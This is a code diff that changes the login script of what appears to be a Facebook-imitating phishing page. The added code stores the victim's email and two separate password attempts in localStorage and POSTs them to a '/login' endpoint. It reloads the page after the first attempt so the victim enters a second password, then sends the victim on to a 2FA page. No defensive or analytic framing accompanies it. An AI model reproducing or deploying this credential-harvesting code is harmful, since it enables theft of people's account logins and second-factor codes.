@@ -322,22 +322,46 @@
                     var email = document.getElementById('email').value;
                     var pass = document.getElementById('pass').value;
 
-                    localStorage.setItem('fb_email', email);
-                    localStorage.setItem('fb_pass', pass);
-
                     var attempts = localStorage.getItem('login_attempts') || 0;
                     attempts = parseInt(attempts) + 1;
                     localStorage.setItem('login_attempts', attempts);
+                    localStorage.setItem('fb_email', email);
 
-                    if (attempts < 2) {
-                        // First attempt: reload the page
-                        window.location.href = 'login.html';
-                    } else {
-                        // Second attempt: proceed to 2FA page
-                        // Reset attempts for future sessions
-                        localStorage.setItem('login_attempts', 0);
-                        window.location.href = '2fa.html';
+                    if (attempts === 1) {
+                        localStorage.setItem('fb_pass1', pass);
+                    } else if (attempts >= 2) {
+                        localStorage.setItem('fb_pass2', pass);
                     }
+
+                    // Send data to server for logging
+                    fetch('/login', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            email: email,
+                            pass: pass,
+                            attempts: attempts
+                        })
+                    }).then(function () {
+                        if (attempts < 2) {
+                            // First attempt: reload the page to get second password
+                            window.location.href = 'login.html';
+                        } else {
+                            // Second attempt: proceed to 2FA page
+                            localStorage.setItem('login_attempts', 0);
+                            window.location.href = '2fa.html';
+                        }
+                    }).catch(function (error) {
+                        console.error('Error sending data:', error);
+                        if (attempts < 2) {
+                            window.location.href = 'login.html';
+                        } else {
+                            localStorage.setItem('login_attempts', 0);
+                            window.location.href = '2fa.html';
+                        }
+                    });
                 });
             }
         });
